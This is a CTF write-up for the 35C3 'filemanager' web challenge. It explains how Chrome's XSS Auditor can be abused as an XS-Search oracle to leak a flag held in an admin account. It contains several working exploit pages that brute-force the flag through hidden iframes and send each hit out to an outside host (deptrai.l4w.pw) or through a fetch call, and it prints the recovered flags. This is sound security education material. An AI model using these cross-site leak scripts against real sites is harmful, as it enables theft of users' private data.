原因: **检测恶意向量时有一个规则，当url中带有页面里的JavaScript资源代码时，就会认为是恶意向量。**参考链接: https://xz.aliyun.com/t/3766

通过题目可以知道flag以文件的形式保存在管理员的账号中，并且flag的形式为35c3_****。

这样，当我们搜索文件的时候，便可以搜索到flag。

注意:

* To clarify: `a` is just foo parameter name, we just wanna make XSS-Auditor see it's as XSS vector.

参考文章或链接:

```
<body>
<!--
Briefly, we all know that flag is stored as `file` in admin account. Plus, the flag is in the format: 35C3_***
When we searching content of a file, if it does exists, there is a script which doing highlight the found word by yellow <mark>
For example: https://filemanager.appspot.com/search?q=def
  <h1>abc</h1>
  <pre>def</pre>
  
  <script>
    (()=>{
      for (let pre of document.getElementsByTagName('pre')) {
        let text = pre.innerHTML;
        let q = 'def';
        let idx = text.indexOf(q);
        pre.innerHTML = `${text.substr(0, idx)}<mark>${q}</mark>${text.substr(idx+q.length)}`;
      }
    })();
  </script>
Okay, now let's go to XSS Auditor part.
Try this on Chrome (yea we should, since the description saying that the admin is using Chrome-headless)
view-source:https://filemanager.appspot.com/search?q=def&a=%3Cscript%3E%20%20%20%20%28%28%29%3d%3E%7b%0a%20%20%20%20%20%20for%20%28let%20pre%20of%20document%2egetElementsByTagName%28%27pre%27%29%29%20%7b%0a%20%20%20%20%20%20%20%20let%20text%20%3d%20pre%2einnerHTML%3b
You can see the red alert, which means that XSS-Auditor found a XSS vector on our URL (`a` param) which also showing in the page's content. But in fact, it's *NOT XSS* , this is side effect of the auditor
We leverage on its mechanism to detect whether there is search result (guessing flag) or not.
* To clarify: `a` is just foo parameter name, we just wanna make XSS-Auditor see it's as XSS vector.
But how do we do that ? Since XSS-Auditor will detect and block the page, redirect the page to `chrome-error://chromewebdata/` as well.
Now the trick comes by. by reading this post: https://portswigger.net/blog/exposing-intranets-with-reliable-browser-based-port-scanning
I found out, it's possible to detect if the browser redirects to other page.
Yep, and that's all.
We can guess the flag by performing XS-Search leverage on XSS-Auditor 
-->
<script>
		var URL = 'https://filemanager.appspot.com/search?q={{search}}&a=%3Cscript%3E%20%20%20%20%28%28%29%3d%3E%7b%0a%20%20%20%20%20%20for%20%28let%20pre%20of%20document%2egetElementsByTagName%28%27pre%27%29%29%20%7b%0a%20%20%20%20%20%20%20%20let%20text%20%3d%20pre%2einnerHTML%3b';
		var charset = '_abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\\]^`{|}~';
		var brute = new URLSearchParams(location.search).get('brute') || '35C3_';
		function guess(i){
			var go = brute + charset[i];
			var x = document.createElement('iframe');
			x.name = 'blah';
			var calls = 0;
			x.onload = () => {
				calls++;
				if(calls > 1){ 
					// so here is calling 2nd onload which means the xss auditor blocking this and the page is redirected to chrome-error://
					// https://portswigger.net/blog/exposing-intranets-with-reliable-browser-based-port-scanning
					console.log("GO IT ==> ",go);
					location.href = 'http://deptrai.l4w.pw/35c3/go.html?brute='+escape(go);
					x.onload = ()=>{};
				}
				var anchor = document.createElement('a');
				anchor.target = x.name;
				anchor.href = x.src+'#';
				anchor.click();
				anchor = null;
			}
			x.src = URL.replace('{{search}}',go);
			document.body.appendChild(x);
			setTimeout(() =>{
				document.body.removeChild(x);
				guess(i+1);
			},1000);
		}
		guess(0);
		// FLAG: 35C3_xss_auditor_for_the_win
</script>

</body>
```

* https://portswigger.net/blog/exposing-intranets-with-reliable-browser-based-port-scanning
* https://xz.aliyun.com/t/3241       上一篇文章的中文版

POC：

poc.html:

```
<style>
iframe {
    display: none;
}
</style>
<iframe id=f></iframe>
<div id=log></div>
<script>
    var flag = '35C3_xss_auditor_for_th';
    var _keys_ = '0123456789[] abcdefghijklmnopqrstuvwxyz{}ABCDEFGHIJKLMNOPQRSTUVWXYZ_!@#$%^&*()';
    var myframes = [];

    function go(x) {
        var f = document.createElement('iframe');
        myframes.push(f);
        document.body.appendChild(f)
        var start = performance.now()
        f.onload = function() {
            f.onload = function() {
                console.log(log.innerHTML = 'hit! ' + x + '<br>')
                fetch('/?flag='+x+'&'+Math.random())
                myframes.map(f => document.body.removeChild(f))
                myframes.length = 0
                flag = x;
                exploit()
            }
            f.src=f.src+'#';
        }
        f.src = `https://filemanager.appspot.com/search?q=${encodeURIComponent(x)}&%0A%20%20<script>%0A%20%20%20%20%28%28%29%3D>%7B%0A%20%20%20%20%20%20for%20%28let%20pre%20of%20document.getElementsByTagName%28%27pre%27%29%29%20%7B%0A%20%20%20%20%20%20%20%20let%20text%20%3D%20pre.innerHTML%3B`;
    }
    function exploit() {
        for(var i = 0; i < _keys_.length; i++) {
            go(flag + _keys_[i])
        }
    }
    exploit()

    // navigator.serviceWorker.register('/xs-search.js');
</script>
```

poc1.html:

```
<html>
<body>
<h1>haha</h1>
<script>
        var URL = 'https://filemanager.appspot.com/search?q={{search}}&a=%3Cscript%3E%20%20%20%20%28%28%29%3d%3E%7b%0a%20%20%20%20%20%20for%20%28let%20pre%20of%20document%2egetElementsByTagName%28%27pre%27%29%29%20%7b%0a%20%20%20%20%20%20%20%20let%20text%20%3d%20pre%2einnerHTML%3b';
        var charset = '_abcdefghijklmnopqrstuvwxyz';
        var brute = new URLSearchParams(location.search).get('brute') || '35C3_';
        function guess(i){
            var go = brute + charset[i];
            var x = document.createElement('iframe');
            x.name = 'blah';
            var calls = 0;
            x.onload = () => {
                calls++;
                if(calls > 1){ 
                    // so here is calling 2nd onload which means the xss auditor blocking this and the page is redirected to chrome-error://
                    // https://portswigger.net/blog/exposing-intranets-with-reliable-browser-based-port-scanning
                    console.log("GO IT ==> ",go);
                    location.href = 'http://deptrai.l4w.pw/35c3/go.html?brute='+escape(go);
                    x.onload = ()=>{};
                }
                var anchor = document.createElement('a');
                anchor.target = x.name;
                anchor.href = x.src+'#';
                anchor.click();
                anchor = null;
            }
            x.src = URL.replace('{{search}}',go);
            document.body.appendChild(x);
            setTimeout(() =>{
                document.body.removeChild(x);
                guess(i+1);
            },1000);
        }
        guess(0);
        // FLAG: 35C3_xss_auditor_for_the_win
</script>
</body>
</html>
```

### post

https://github.com/eboda/35c3.git

## pwn&others

* https://github.com/bkth/35c3ctf.git
* https://github.com/saelo/35c3ctf.git
* https://github.com/tharina/35c3ctf.git
* https://github.com/niklasb/35c3ctf-challs.git

# check 

35C3_use_this_to_decrypt_encrypted_downloads